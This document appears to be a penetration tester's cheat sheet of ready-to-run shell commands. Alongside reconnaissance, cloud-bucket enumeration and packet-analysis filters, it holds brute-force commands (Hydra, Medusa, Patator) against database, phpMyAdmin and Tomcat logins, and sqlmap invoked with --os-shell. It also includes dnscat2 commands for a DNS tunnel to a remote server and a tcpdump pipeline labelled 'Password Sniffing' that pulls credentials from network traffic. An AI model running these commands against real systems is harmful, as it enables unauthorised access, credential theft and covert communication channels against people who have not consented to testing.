curl https://api.hackertarget.com/dnslookup/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/reversedns/?q=$ip --connect-timeout 15
curl https://api.hackertarget.com/mtr/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/subnetcalc/?q=$hostname --connect-timeout 15
curl https://api.hackertarget.com/nmap/?q=$hostname --connect-timeout 15


curl -s "https://api.hackertarget.com/hostsearch/?q=$1" | cut -d ',' -f1 | sort -u

curl http://api.hackertarget.com/hostsearch/?q=$target -m 30 | sed 's/,/ /' | awk '{print $1}' | grep "$target" >> /tmp/onlineFoundSubdomains




[+]certspotter
		curl https://certspotter.com/api/v0/certs\?domain\=$1 | jq '.[].dns_names[]' | sed 's/\"//g' | sed 's/\*\.//g' | uniq
	[+]crtsh
		curl -s https://crt.sh/?q=%.$1  | sed 's/<\/\?[^>]\+>//g' | grep $1


    curl -s "https://certspotter.com/api/v0/certs?domain=$1" | jq '.[].dns_names[]' 2> /dev/null | sed 's/\"//g' | sed 's/\*\.//g' | grep -w $1\$ | sort -u >> tmp.txt &
    curl -s "https://crt.sh/?q=%.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u >> tmp.txt &
    curl -s "https://dns.bufferover.run/dns?q=.$1" | jq -r .FDNS_A[] 2>/dev/null | cut -d ',' -f2 | grep -o "\w.*$1" | sort -u >> tmp.txt &
    curl -s "https://dns.bufferover.run/dns?q=.$1" | jq -r .RDNS[] 2>/dev/null | cut -d ',' -f2 | grep -o "\w.*$1" | sort -u >> tmp.txt &
    curl -s "https://tls.bufferover.run/dns?q=.$1" | jq -r .Results 2>/dev/null | cut -d ',' -f3 | grep -o "\w.*$1"| sort -u >> tmp.txt &
    curl -s "https://api.hackertarget.com/hostsearch/?q=$1" | cut -d ',' -f1 | sort -u >> tmp.txt &
    curl -s "https://rapiddns.io/subdomain/$1?full=1#result" | grep -oaEi "https?://[^\"\\'> ]+" | grep $1 | sed 's/https\?:\/\///' | cut -d "/" -f3 | sort -u >> tmp.txt &
    curl -s "https://riddler.io/search/exportcsv?q=pld:$1" | grep -o "\w.*$1" | cut -d ',' -f6 | sort -u >> tmp.txt &
    curl -s "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=$1" | jq '.subdomains' | cut -d '"' -f2 | cut -d '[' -f1 | cut -d ']' -f1 | grep . | sort -u >> tmp.txt &
    curl -s "https://api.threatminer.org/v2/domain.php?q=$1&rt=5" | jq -r '.results[]' | sort -u >> tmp.txt &
    curl -s "https://urlscan.io/api/v1/search/?q=domain:$1" | jq -r '.results[].page.domain' | sort -u >> tmp.txt &
    curl -s "https://www.virustotal.com/ui/domains/$1/subdomains?limit=40" | grep '"id":' | cut -d '"' -f4 | sort -u >> tmp.txt &
    csrftoken=$(curl -ILs https://dnsdumpster.com | grep csrftoken | cut -d " " -f2 | cut -d "=" -f2 | tr -d ";")
    curl -s --header "Host:dnsdumpster.com" --referer https://dnsdumpster.com --user-agent "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0" --data "csrfmiddlewaretoken=$csrftoken&targetip=$1" --cookie "csrftoken=$csrftoken; _ga=GA1.2.1737013576.1458811829; _gat=1" https://dnsdumpster.com >> dnsdumpster.html
    if [[ -e $1 && -s $1 ]]; then # file exists and is not zero size
        cat dnsdumpster.html | grep "https://api.hackertarget.com/httpheaders" | grep -o "\w.*$1" | cut -d "/" -f7 | grep '.' | sort -u >> tmp.txt
    fi







Finding netblocks that belong to an ASN using targets-asn NSE script
nmap --script targets-asn --script-args targets-asn.asn=$ASN

Find Information about IP address
nmap --script=asn-query,whois,ip-geolocation-maxmind 192.168.1.0/24

find ASN for a given IP address
curl -s http://ip-api.com/json/$IP | jq -r .as

echo "[+] Lookup autonomous systems of all outgoing http/s traffic"
ss -t -o state established '( dport = :443 || dport = :80 )'|grep tcp|awk '{ print $5 }'|sed s/:http[s]*//g|sort -u|netcat whois.cymru.com 43|grep -v "AS Name"|sort -t'|' -k3


curl https://api.hackertarget.com/aslookup/?q=$1 > IP_LIST.txt

Get Autonomous System details
echo "AS15169" | spysecli as



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] LDAP - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


ldapsearch -x -h target-ip -b "dc=domain,dc=tld"


windapsearch.py -d host.domain.tld -u domain\\ldapbind -p password -U





##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] SQL - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##



for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "mysql" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=3306 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;
for a in `cat $FINDSPLOIT_DIR/msf_search/auxiliary | egrep "postgres" | egrep "scanner" | awk '{print $1}'`; do echo -e "$COLOR2Running Metasploit module: $a..." && msfcli $a LHOST=192.168.1.145 RHOST=$TARGET RHOSTS=$TARGET RPORT=5432 USER_FILE=$USER_FILE PASS_FILE=$PASS_FILE THREADS=$THREADS E; done;


nnmap --script=pgsql* -p 5432 $TARGET
nnmap --script=mysql* -p 3306 $TARGET
nmap -sV -Pn -vv –script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 10.0.0.1 -p 3306


## backup all mysql databases
mysqldump -u username -ppassword --all-databases --single-transaction


## connect to windows mssql Server
mssqlclient.py -windows-auth username@target-ip
mssql-cli -S target-ip -U username

mssqlclient.py -port 27900 user:password@10.1.1.1
sqsh -S 10.1.1.1 -U user -P password


##-=========================================-##
##   [+] THC-Hydra - Brute Force - MySQL
##-=========================================-##
hydra -l sa -P ../creds/pass.txt target-ip -s target-port mssql

hydra -t 5 -V -f -l root -e ns -P common.txt localhost mysql
hydra -v -l root -P fpass.lst -t 1 mysql://ip -o brute_mysql.out
hydra -v -l sa -P fpass.lst -t 4 10.10.10.2 mssql -o brute_mssql.out
hydra -t 5 -V -f -l sa -P "C:\pass.txt" 1.2.144.244 mssql
hydra mssql://172.22.71.247:1433 -l sa -P /root/Desktop/parolalar


patator mysql_login host=$line user=FILE0 password=FILE1 0=$USERNAME 1=$PASSWORD -x ignore:mesg='Login incorrect.' -x ignore,retry:code=500

patator mysql_login host=$line user=FILE0 password=FILE1 0=$USERNAME 1=$PASSWORD -x ignore:mesg='Login incorrect.' -x ignore,retry:code=500



sqlmap -u http://$Domain --crawl 3 --dbs --answer="redirect=Y" --batch 



# sqlmap; post-request - captured request via Burp Proxy via Save Item to File.
sqlmap -r post-request -p item --level=5 --risk=3 --dbms=mysql --os-shell --threads 10


Scuba

• MSSQL DataMask
• SQLRECON




## bruteforce basic_auth
medusa -h target-ip -U ../creds/usernames.txt -P ../creds/passwords.txt -M http -m DIR:/printers -T 10


patator http_fuzz url=http://$line/phpmyadmin/index.php method=POST body='pma_username=root&pma_password=FILE0&server=1&target=index.php&lang=en&token=' 0=$PASSWORD before_urls=http://$line/phpmyadmin/index.php accept_cookie=1 follow=1 -x ignore:fgrep='Cannot log in to the MySQL server' -l /tmp/qsdf

patator http_fuzz url=http://$line/pma/index.php method=POST body='pma_username=COMBO00&pma_password=COMBO01&server=1&target=index.php&lang=en&token=' 0=$arg2 before_urls=http://$line/pma/index.php accept_cookie=1 follow=1 -x ignore:fgrep='Cannot log in to the MySQL server' -l /tmp/qsdf


hydra -l root -P /home/infosecaddicts/list.txt -e n http-post-form://172.31.2.24 -m "/phpMyAdmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1:S=information_schema"



hydra -l tomcat -P list.txt -e ns -s 8080 -vV 172.31.2.24 http-get /manager/html



##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] XSS - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##

Cross-site scripting (XSS)
• Cross-site request forgery attacks (XSRF/CSRF)
xsstracer $Domain 80


xsser -u http://$Domain -c10 --Cw=200 --auto --save --follow-redirects






##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##
##   	[+] Cloud - Discovery + Enumeration + Pentesting
##-===========================================================-##
##-<!>~<!>~<!>~<!>~<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-<!>-##
##-===========================================================-##


cloud_enum.py -k companynameorkeyword

AWSBucketDump.py -l $File.txt
python AWSBucketDump.py -D -l BucketNames.txt -g s.txt

php s3-buckets-bruteforcer.php --bucket gwen001-test002

s3scanner.py --include-closed --out-file $File.txt --dump $File.txt



aws sts get-caller-identity
aws s3 ls
aws s3 ls s3://bucket.com
aws s3 ls --recursive s3://bucket.com
aws iam get-account-password-policy
aws sts get-session-token



athenaquery="SELECT * FROM rapid7_fdns_any WHERE name LIKE '%."$scope"' AND date = (SELECT MAX(date) from rapid7_fdns_any)"

queryid=$(aws athena start-query-execution --query-string "$athenaquery" --query-execution-context Database=default --result-configuration OutputLocation=s3://your-athena-results-bucket-here/ --output text

aws athena get-query-execution --query-execution-id "$queryid" --output json

aws athena get-query-results --query-execution-id "$queryid" --output json









DNS Tunneling

ruby ./dnscat2.rb dnscat2> New session established: 1422 dnscat2> session -i 1422


Target Machine:
dnscat --host <dnscat server ip>




 Start the dnscat2 Server
sudo ruby ./dnscat2.rb --security=authenticated --secret=12viFdfMonso3dF
pentestdomain.com



Start the dnscat2 Client
./dnscat --retransmit-forever --secret=12viFdfMonso3dF pentestdomain.com







## ----------------------------------------------------- ##
##  [+] Using Grep and regular expressions and output to a file
## ----------------------------------------------------- ##
cat index.html | grep -o 'http://\[^"\]\*' | cut -d "/" -f 3 | sort –u > list.txt



## ----------------------------------------------------- ##
##   [?] Use a bash loop to find the IP address behind each host
## ----------------------------------------------------- ##
for url in $(cat list.txt); do host $url; done



## -------------------------------------- ##
##   [?] DNS Zone Transfer - Bash Loop
## -------------------------------------- ##
for x in $(host -t ns $domain | cut -d ' ' -f4); do
     host -l $domain $x
done



## ------------------------------------------------ ##
##   [?] DNS Subdomain - IP Address Enumeration
## ------------------------------------------------ ##
for x in $(cat /usr/share/dnsenum/dns.txt); do
     host $x.$domain | grep 'has address' | cut -d ' ' -f1,4 >> tmp
done



## --------------------------------------------------------------------------- ##
##  [+] Collect all the IP Addresses from a log file and sort by frequency
## ----------------------------------------------------- ##
cat access.log | cut -d " " -f 1 | sort | uniq -c | sort -urn



##-====================================================================-##
##  [+] Ban all IPs that attempted to access phpmyadmin on your site
##-====================================================================-##
grep "phpmyadmin" $path_to_access.log | grep -Po "^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}" | sort | uniq | xargs -I% sudo iptables -A INPUT -s % -j DROP





##-======================================-##
##   [+] Get Cisco network information
##-======================================-##
tcpdump -nn -v -i eth0 -s 1500 -c 1 'ether[20:2] == 0x2000'





## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 src 10.0.0.10
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 dst 10.0.0.10
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 'udp port 53'
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 'tcp port 443'
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -lnni eth0 'dst 10.0.0.10 and dst port 443'
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -w out.pcap -s 65535 'udp port 53'
## ------------------------------------------------------------------------------------------------ ##



## ------------------------------------------------------------------------------------------------ ##
	tcpdump -r $Capture.pcap                             ## Read the file
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -n src host 192.168.2.10 -r $Capture.pcap     ## Filter By Source
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -n dst host 192.168.2.12 -r $Capture.pcap     ## Filter By Destination
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -n port 443 -r $Capture.pcap                  ## Filter By Port
## ------------------------------------------------------------------------------------------------ ##
	tcpdump -nX -r $Capture.pcap                          ## Read the file and dump in hex format
## ------------------------------------------------------------------------------------------------ ##



##-====================================-##
##   [+] convert a .cap file to .txt:
##-====================================-##
tshark -V -r $File > $File


##-================================================================-##
##   [+] select all ftp traffic through internet gateway snup:
##-================================================================-##
gateway snup and (port ftp or ftp-data)


##-==========================================-##
##   [+] select the start and end packets
##-==========================================-##
## ------------------------------------------------------------ ##
##   [?] The SYN and FIN packets of each
##       TCP conversation that involves a non-local host.
## ------------------------------------------------------------ ##
tcp[tcpflags] & (tcp-syn|tcp-fin) != 0 and not src and dst net localnet



##-=========================================================-##
##   [+] select all IPv4 HTTP packets to and from port 80
##   [+] print only packets that contain data
##-=========================================================-##
## ---------------------------------------------------------------------- ##
##   [?] for example, not SYN and FIN packets and ACK-only packets.
## ---------------------------------------------------------------------- ##
tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)



##-=================================================================-##
##   [+] select IP broadcast or multicast packets
##   [+] that were not sent via Ethernet broadcast or multicast:
##-=================================================================-##
ether[0] & 1 = 0 and ip[16] >= 224



##-===================================================================-##
##   [+] select all ICMP packets that are not echo requests/replies
##-===================================================================-##
## ---------------------------------- ##
##   [?] (i.e., not ping packets)
## ---------------------------------- ##
icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply


##-====================================-##
##   [+] catch all multicast traffic
##-====================================-##
'ether[0] & 1 != 0'


##-==========================================================-##
##   [+] match only tcp packets whose source port is $Port
##-==========================================================-##
tcp src port $Port


##-====================================-##
##   [+]
##-====================================-##
tcp port 21, 'udp portrange 7000-7009', 'wlan addr2 0:2:3:4:5:6'


##-============================================-##
##  			[+] HTTP Statistics
##-============================================-##
tshark -r $File -q -z http,stat,


##-===================================================-##
##  		[+] HTTP Statistics with Rates
##-===================================================-##
tshark -r $File -q -z http,tree


##-===================================================-##
##  		[+] TOP 10 HTTP Request URL
##-===================================================-##
tshark -r $File -R http.request -T fields -e http.host | sed -e 's/?.*$//' | sed -e 's#^\(.*\)\t\(.*\)$#http://\1\2#' | sort | uniq -c | sort -rn | head -n 10


##-===================================================-##
##  		[+] TOP 10 talkers by Source IP
##-===================================================-##
tshark -r $File -T fields -e ip.src | sort | uniq -c | sort -rn | head -10


##-===================================================-##
##  		[+] TOP 10 talkers by DST IP
##-===================================================-##
tshark -r $File -T fields -e ip.dst | sort | uniq -c | sort -rn | head -10


##-=====================================================-##
##   [+] TOP 10 talkers by port usage or SYN attempts
##-=====================================================-##
tshark -r $File -T fields -e ip.src "tcp.flags.syn==1 && tcp.flags.ack==0" | sort | uniq -c | sort -rn | head -10


##-===================================================-##
##   [+] HTTP 10 Response Code 200 and Content Type
##-===================================================-##
tshark -r $File -R http.response.code==200 -T fields -e "http.content_type" |sort |uniq -c | sort -rn | head -10


##-===================================================-##
##  	[+] TOP HTTP Host and Request Method
##-===================================================-##
tshark -r $File -R http.host -T fields -e http.host -e http.request.method |sort |uniq -c | sort -rn | head -10


##-===================================================-##
##  		[+] TOP 10 DNS Query DST Host
##-===================================================-##
tshark -r $File -T fields -e dns.qry.name -R "dns.flags.response eq 0" |sort |uniq -c | sort -rn | head -10


##-===================================================-##
##  		[+] TOP 10 DNS Query by Soure IP
##-===================================================-##
tshark -r $File -T fields -e ip.src -R "dns.flags.response eq 0" |sort |uniq -c | sort -rn | head -10


##-===================================================-##
##  		[+] TOP 10 ICMP Conversations
##-===================================================-##
tshark -r $File -V icmp -T fields -e icmp.ident -e ip.src |sort |uniq -c | sort -rn | head -10


##-===================================================-##
##   [+] Capture only first 56 bytes of each frame
##-===================================================-##
## -------------------------------------------------------------- ##
##   [?] enough to cover the IP header and typical TCP header.
## -------------------------------------------------------------- ##
tcpdump -nn -i eth0 -w $File.pcap -s 56


## ------------------------------------------------------------------------------------------------ ##
	tshark -i any -f 'port http' -Y http -l -N nNC		## HTTP Protocol Traffic
## ------------------------------------------------------------------------------------------------ ##
	tshark -i any -f 'port smtp' -Y smtp -l -N nNC		## SMTP Protocol Traffic
## ------------------------------------------------------------------------------------------------ ##
	tshark -i any -f 'port imap' -Y imap -l -N nNC		## IMAP Protocol Traffic
## ------------------------------------------------------------------------------------------------ ##





##-=======================================================-##
##    [+] Filter out traffic with a source MAC of $MAC
##-======================================================-##
tshark -r $File.cap -2 -R "wlan.sa==$MAC && wlan.fc.type_subtype==0x08" -T fields -e frame.time.delta | head -n 2






##-=============================================-##
##   [+] View the “topN” talkers to identify
##       the noisiest IPs by flow count.
##-=============================================-##
nfdump -r $File -s ip/flows -n 10







##-===================================================-##
##   [+]
##-===================================================-##
tcpxtract --file $File.pcap --output $File --device eth0
















##-======================================-##
##   [+] analyze traffic remotely over ssh w/ wireshark
##-======================================-##
ssh root@server.com 'tshark -f "port !22" -w -' | wireshark -k -i -






egrep -o 'acct_id=[0-9]+' access.log | cut -d= -f2 | sort | uniq -c | sort -rn




##-==============================================================-##
##  [+] Retrieve dropped connections from firewalld journaling
##-==============================================================-##
journalctl -b | grep -o "PROTO=.*" | sed -r 's/(PROTO|SPT|DPT|LEN)=//g' | awk '{print $1, $3}' | sort | uniq -c











sniffit
ettercap





##-===========================-##
##   [+] Password Sniffing
##-===========================-##
tcpdump -i eth0 port http or port ftp or port smtp or port imap or port pop3 -l -A | egrep –i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=||name=|name:|pass:|user:|username:|password:|login:|pass |user ' --color=auto --line-










